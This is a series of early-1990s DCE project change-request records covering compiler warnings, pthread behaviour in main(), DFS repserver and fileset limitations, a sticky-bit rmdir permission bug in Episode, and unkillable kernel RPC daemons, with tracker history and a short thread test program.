Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : cds functions and bad returns
Reported Date                 : 2/19/92
Found in Baseline             : 1.0.1
Found Date                    : 2/19/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/19/92 public]
gcc -w -O generated the following errors in cds code.  
They refer to functions that may return either with or
without a value which is not a good thing.  Below is the
error message as generated by gcc and the filename, line number,
and name of the offending function.

"warning: this function may return with or without a value"

src/directory/cds/cdsbrowser/cds_browsersource.c:283:SourceIsNodeParent 
src/directory/cds/control/op_list.c:697:close_one_file
src/directory/cds/gda/gda_bind.c:2589:split_fullname
src/directory/cds/gda/gda_main.c:1061:read_debug_commands
src/directory/cds/library/cdsstrtosimple.c:67:combine 
src/directory/cds/library/deb_event_mgr.c:1158:deb_Performance 
src/directory/cds/library/dns_record.c:287:pass_AttributeContents 
src/directory/cds/library/triggers_lib.c:150:value_size 
src/directory/cds/server/db_btree.c:494:split_points 
src/directory/cds/server/db_diags.c:595:db_diag_dump_dir_hash_table
src/directory/cds/server/dns_service_rpc.c:1605:srv_disable_server_thread 
src/directory/cds/server/dump_navigator.c:721:walk_offset 
src/directory/cds/server/server_main.c:1037:sec_init_thread

[3/19/92 public]
Digital is working on this bug now.

[4/13/92 public]
Changed to enhancement.



CR Number                     : 1670
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : 
Short Description             : pthread_exit cannot be called from main()
Reported Date                 : 06/20/91
Found in Baseline             : .38
Found Date                    : 
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[01/29/92 public]

Orbit reference number 2086
reference     
product       dce_osf
phaseFound    development

History:
lastUpdate    91/11/05 15:38:19
endDate                                
assignDate    91/10/30 14:57:44   





    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/06/20 10:48:54    create          hirsch (Phil Hirsch)
    91/07/11 16:24:52    return          wkh (Ward K. Harold)
    91/07/12 08:53:22    note            ebrown (Erik Brown)
    91/10/30 14:57:44    reopen          hirsch (Phil Hirsch)
    91/10/31 07:23:10    note            hirsch (Phil Hirsch)
    91/10/31 09:24:40    modify          adm (DCE Family Administrator)
    91/11/05 15:38:19    modify          drb (Defect Review Board)

[06/20/91 public]
The below test shows that CMA raises an exception when the initial thread
(the main() routine) exits.  However, I can't find any provision for
this in the pthread spec (P1003.4a/D4).  The text for pthread_exit()
says

        "The process will exit when the last running thread calls
         pthread_exit()."

which seems to imply that main() should behave like any other thread.

When this test is run, the following error appears when main() calls
pthread_exit:

      %CMA exception, Current thread has been requested to exit.
      IOT trap (core dumped)

========================== start of test program ============================
/*
 * Copyright (C) 1990 Transarc Corporation
 * All Rights Reserved
 */
/*
 * main_test.c -- test early exit of the main routine
 */

#include <stdio.h>
#include <pthread.h>

/*
 * testThread() -- testing thread.  This simply prints a message and exits.
 */
testThread(y)
  int y;
{
    pthread_yield();
    fprintf(stderr, "testThread: arg %d\n", y);
    pthread_yield();
    pthread_exit(y);
}

/*
 * main() -- start maxThreads threads and exits.  We should be able to
 *     start all the threads and exit before any of the test threads are
 *     scheduled, but the testThread's call pthread_yield() just to make
 *     sure that main() will exit first.
 */
main(argc,argv)
  int argc;
  char **argv;
{
    int i;
    int maxThreads = 5;
    pthread_t th;
    int err;

    fprintf(stderr,"Starting %d threads\n",maxThreads);


    for (i=0; i<maxThreads; i++) {
        err = pthread_create(&th, pthread_attr_default, testThread, i);
        if (err != 0) {
            fprintf(stderr,"main: pthread_create failed\n");
            exit(1);
        }
        pthread_detach(&th);
    }

    /*
     * Cause the main() thread to exit.  The other threads should
     * continue execution.
     */
    fprintf(stderr,"main: exiting\n");
    pthread_exit(0);
    /* task execution should continue */
}

================= end of test program ===============================

[07/11/91 public]
The pthread spec does imply that you should be able to pthread_exit() *any*
thread but clearly the thread executing main() is special because it's
continuation is different than pthread_create() generated threads. So exiting
the main() thread will result in a return to the Crtl start() routine which
will exit killing the process. Webb Scales seemed to think this was documented
somewhere.

[07/12/91 public]
Ward Harold claims that exiting the main() thread will result in a
return to the start() routine.  This is true only if the code falls
off the end of main(), which certainly must be a limitation for DCE
threads.  However, if the main() thread calls pthread_exit(), the
threading package should be able to do one of the following to allow
the process to continue execution.

    1) Block on a condition variable that is never signalled.
       Alternately, this could be signalled when all other threads
       have exited.

    2) Remove this (main) thread from the run queue, possibly
       re-using the data structures for a subsequent thread
       creation request.  In theory, this would allow other
       threads to continue execution.

Also, we have not found any reference in our latest documents, or in
the pthread extensions document from DEC.  It could be we just missed it.

[10/30/91 public]

Erik Brown (eeb@transarc.com) comments:

I would like the DRB to review this defect and consider marking it as deferred,
rather than returned, so that it is fixed in a future release.

[10/31/91 public]
We'd like to change the severity of this defect from 2 to 3; I think that
someone in Austin has to do this for us, tho.

[10/31/91 public]
Severity changed at Phil Hirsch's request

[11/05/91 public]
This defect has been marked 'deferred' (do not fix in 1.0) by the DRBoard.  Reason:
Consider for future implementations.

[03/19/92 public]
Defer this again.  Implementation of requested functionality is
quite involved, and conformance to a mere draft of the Pthreads
spec is insufficient motivation to do it for 1.0.1.

[10/20/92 public]

OT cleanup 1 : New Severity = D ; New priority = 1
               Old severity = C ; Old priority = 2

N.B. Downgraded both the severity and priority of this defect.
     (C seems inappropriate for this). 

     Raised the priority to 1 because this defect will violate
     1.0.2 exit criteria i.e. 1.0.2 cannot ship with any code defect 
     older than 180 days old. Hence the priority is being raised to 
     to ensure that this defect is going to be addressed quickly.
     Some of the possibilities are:

     a. cancel the bug
     b. is such a lower priority that it is not going to be fixed,
        but it could be documented as a limitation.
     c. the bug will be fixed.
     d. convert this to an enhancement.

     I will revisit and update this report as to what my recommendations
     are for dealing with this defect (I can't do it this instant because
     I am in the middle of OT cleanup which is the highest priority item
     I have to do). But I am leaning towards either b or d.

[jd 11/05/92 public] 
Made this an enhancement request for 1.1. Responsible Eng. unassigned.



CR Number                     : 1132
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4821
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : repserver
Short Description             : repserver -mainprocs is limited to 1 process
Reported Date                 : 12/19/91
Found in Baseline             : .60d
Found Date                    : 
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[01/29/92 public]

Orbit reference number 4308
reference     
product
phaseFound    development

History:
lastUpdate    91/12/19 13:41:21
endDate                                
assignDate    91/12/19 13:41:21   

    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/12/19 13:41:22    create          hirsch (Phil Hirsch)

[12/19/91 public]

The repserver currently defaults to 1 -mainprocs process, and cannot be run
with more than 1 such process.

[03/18/92 public]
per agreement, deferred to DCE 1.1.

[8/13/92 public]
Deferring to 1.1 is a little extravagant.  Hope to fix it by 1.0.2.
I had created OT 4821 to describe the same situation, which I've now marked
as a dup of this one.
Filled in Inter-dependent CRs with `4821' 
Changed H/W Ref Platform from `rs6000' to `all' 
Changed S/W Ref Platform from `aix' to `all' 
Filled in Subcomponent Name with `repserver' 
Changed Severity from `C' to `D' 
Changed Priority from `2' to `3' 
Changed Status from `defer' to `open' 
Changed Fix By Baseline from `1.1' to `1.0.2' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/19/92 public]
Think of this as an enhancement.  Except for performance, repserver
works fine as it is even with this single-thread limitation.
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 1115
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : fileset
Short Description             : DFS has its own notion of 'read-only' filesets
Reported Date                 : 12/17/91
Found in Baseline             : .60d
Found Date                    : 
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[01/29/92 public]

Orbit reference number 4237
reference     
product
phaseFound    development

History:
lastUpdate    91/12/17 15:01:54
endDate                                
assignDate    91/12/17 15:01:54   

    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/12/17 15:01:55    create          hirsch (Phil Hirsch)

[12/17/91 public]

DFS has its own notion of read-only filesets that has not been
integrated with vendors' notions of read-only mount points or read-only
disk devices (aggregates).

[03/19/92 public]
per agreement, there are no plans to fix this in the 1.0.1 timeframe.
Marking deferred.

[9/28/92 public]
Filled out transarc fields.  This sounds as if it is an enhancement.
I've marked it as such.  Craig, can you look at this and decide if it
is real, or if it should be left to the vendor's integration.
Changed Defect or Enhancement? from `def' to `enh' 
Filled in Subcomponent Name with `fileset' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 1009
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : LFS allows rmdir in dir with stick bit set and not owner
Reported Date                 : 04/18/91
Found in Baseline             : 1.0
Found Date                    : 
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : fixed
Transarc Deltas               : bwl-db4990-observe-sticky-bit -r1.2
Transarc Herder               : jdp@transarc.com

[01/29/92 public]
Orbit reference number 1533
reference     
product       dce_osf
phaseFound    development
History:
lastUpdate    91/11/05 16:03:44
endDate                                
assignDate    91/04/18 08:52:18   
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/04/18 08:52:19    create          burnett (C. Burnett)
    91/04/18 14:56:04    note            pehkonen (J. Pehkonen)
    91/11/05 16:03:44    modify          drb (Defect Review Board)

[04/18/91 public]
Episode fails the sitb rmdir case which test removing a dir in a dir
with the stick bit set and the parent dir is not owned by the 
removing process.  An EPERM is expected, Episode returns an errno of 0.

[04/18/91 public]
 This problem also occurs when run the test is run against DFS exporting a JFS

[03/19/92 public]
per agreement, assigned to transarc for fix by 1.0.1

[4/9/92 public]
Updated transarc status, resp. engr.

[6/12/92 public]
I tested this today on shared by doing the following:
1) create a directory owned by mason
2) set the 't' bit (as root)
3) create a subdirectory owned by ota
4) remove the directory by bwl
I was careful to make sure the remover did not have root real or
effective uid, so I believe this defect is still present.
Since this was promised for 1.0.1, I've upgraded priority and assigned it
to bwl.
Filled in Subcomponent Name with `lfs' 
Changed Short Description from `EFS allows rmdir in dir with stick bit set and 
 not owner' to `LFS allows rmdir in dir with stick bit set and not owner' 
Filled in Interest List CC with `ota,jdp,mason' 
Changed Severity from `D' to `A' 
Changed Priority from `2' to `1' 
Changed Responsible Engr. from `mason@transarc.com' to `bwl@transarc.com' 
Filled in Transarc Herder with `jdp@transarc.com'

[6/26/92 public]

[7/6/92 public]
Changed Status from `open' to `cancel'

[7/6/92 public]
My comment didn't seem to make it... Per Julie's request in which I'd
been told Bruce concurred, this defect has been cancelled.

[7/6/92 public]

[7/6/92 public]
After speaking with Bruce, it appears that he had not yet decided to
cancel this one.  However, since this is really an enhancement
request, I'm marking it as such, lowering its priority, and letting
Bruce decide what to do with it.  I certainly hope this makes everyone
happy.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Severity from `A' to `B' 
Changed Priority from `1' to `2' 
Changed Status from `cancel' to `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[3/30/94 public]
We're looking at this for 1.1

[7/18/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE' 
Changed Transarc Status from `open' to `fixed' 
Filled in Transarc Deltas with `bwl-db4990-observe-sticky-bit -r1.2'



CR Number                     : 970
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : kruntime
Short Description             : krpc based deamons cannot be killed
Reported Date                 : 10/29/91
Found in Baseline             : 1.0
Found Date                    : 
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[01/29/92 public]

Orbit reference number 3466
reference     
product       dce_osf
phaseFound    development

History:
lastUpdate    91/12/20 10:09:47
endDate                                
assignDate    91/12/20 10:09:47   





    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    91/10/29 12:04:57    create          burnett (C. Burnett)
    91/11/05 15:41:50    modify          drb (Defect Review Board)
    91/12/20 10:07:19    modify          adm (DCE Family Administrator)
    91/12/20 10:09:47    assign          adm (DCE Family Administrator)

[10/29/91 public]
Deamons which are used to start up kernel level processes such as the
DFS which use kernel NCS cannot be kill.  I tried both kill and kill -9.
One should be able to stop these deamons with kill.  When a kill is
issued, all of the threads (kprocs) should be cleaned up and and the
rpc_server_listen should return and let the caller handle the EINTR.

[11/05/91 public]
This defect has been marked 'deferred' (do not fix in 1.0) by the DRBoard.  Reason:
Kernal-based daemons cannot clean up gracefully.

[03/18/92]
This defect has been re-tagged as an enhancement, deferred from 1.0.1



